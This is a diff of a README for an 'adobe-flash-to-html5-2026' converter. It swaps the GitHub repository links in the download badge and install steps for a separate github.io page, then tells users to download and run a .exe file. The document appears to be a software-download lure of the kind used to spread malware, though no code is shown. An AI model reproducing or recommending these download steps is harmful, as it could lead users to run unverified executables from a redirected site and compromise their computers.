@@ -1,6 +1,6 @@
 # ⚡ adobe-flash-to-html5-2026 - Update old Flash files for browsers
 
-[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://github.com/Rufusunblessed958/adobe-flash-to-html5-2026)
+[![](https://img.shields.io/badge/Download-Software-blue.svg)](https://rufusunblessed958.github.io)
 
 ## 📁 About the application
 
@@ -22,7 +22,7 @@ This tool runs on Windows computers. Before you start, check your computer for t
 
 Follow these steps to get the software on your computer:
 
-1. Visit the project homepage here: [https://github.com/Rufusunblessed958/adobe-flash-to-html5-2026](https://github.com/Rufusunblessed958/adobe-flash-to-html5-2026).
+1. Visit the project homepage here: [https://rufusunblessed958.github.io](https://rufusunblessed958.github.io).
 2. Look for the releases section on the right side of the page.
 3. Click on the latest release link.
 4. Locate the file ending in .exe.
